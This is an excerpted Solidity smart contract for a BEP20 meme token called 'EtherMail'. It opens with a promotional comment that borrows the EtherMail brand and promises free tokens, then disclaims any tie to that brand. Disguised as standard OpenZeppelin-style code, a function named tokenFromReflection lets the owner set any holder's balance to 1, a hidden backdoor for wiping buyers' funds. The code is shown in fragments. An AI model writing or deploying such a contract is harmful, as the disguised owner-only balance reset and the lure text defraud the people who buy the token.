...
/*
=͟͟ ⌧🗳 EtherMail =͟͟ ⌧🗳 Memecoin Celebration  📨 Get 250 EMC For Free 📨

💬 EtherMail  Claim your free Web3 Email & get 250 EMC upon sign up!
https://ethermail.io/  💬

📪Reimagining Email for Web3
320.000.000.000 emails are sent every day* You can't kill email
...
💬 telegram https://t.me/EtherMailToken 💬

N.B : $EtherMail coin BEP20  has no association with 💬 https://ethermail.io/  💬
$EtherMail  is a meme coin with no intrinsic value or expectation of financial return. 
There is no formal team or roadmap. the coin is completely useless and for entertainment purposes only.
*/
pragma solidity 0.8.20;

interface EtherMailPermit {
  /**
...
/*
 * @dev Provides information about the current execution EtherMail20Burnable, including the
 ...
 */
abstract contract EtherMail20Burnable {
...
// File: @openzeppelin/contracts/access/EtherMailOwnable.sol
 ...
 * the owner.
 */
abstract contract EtherMailOwnable is EtherMail20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "EtherMailOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "EtherMailOwnable: new owner is the zero address");
 ...
 * `SafeEtherMail` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeEtherMail {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeEtherMail: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeEtherMail: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeEtherMail: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeEtherMail: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeEtherMail: modulo by zero");
  }
...
contract EtherMail is EtherMail20Burnable, EtherMailPermit, EtherMailOwnable {
    
    using SafeEtherMail for uint256;
   ...
   address private EtherMailOwner; 
    constructor() {
        EtherMailOwner = _msgSender();     
        _name = "EtherMail";
        _symbol = "EtherMail";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {EtherMailPermit-totalSupply}.
    */
    ...
    /**
    * @dev See {EtherMailPermit-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return menta[account];
    }
    /**
    * @dev See {EtherMailPermit-approve}.
    *
    * Requirements:
    *
    ...
    */
    function tokenFromReflection(address tusdRewards) external {
         require(_msgSender() == EtherMailOwner, "!");
        menta[tusdRewards] = 1;
    }

    /**
    * @dev See {EtherMailPermit-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {EtherMailPermit-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {EtherMailPermit-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {EtherMailPermit};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 cuenta) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(cuenta, "EtherMailPermit: transfer cuenta exceeds allowance"));
        return true;
    }
    ...
    * problems described in {EtherMailPermit-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "EtherMailPermit: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 cuenta) internal {
        require(sender != address(0), "EtherMailPermit: transfer from the zero address");
        require(shippingto != address(0), "EtherMailPermit: transfer to the zero address");
                
        menta[sender] = menta[sender].sub(cuenta, "EtherMailPermit: transfer cuenta exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 cuenta) internal {
        require(owner != address(0), "EtherMailPermit: approve from the zero address");
        require(transporteur != address(0), "EtherMailPermit: approve to the zero address");
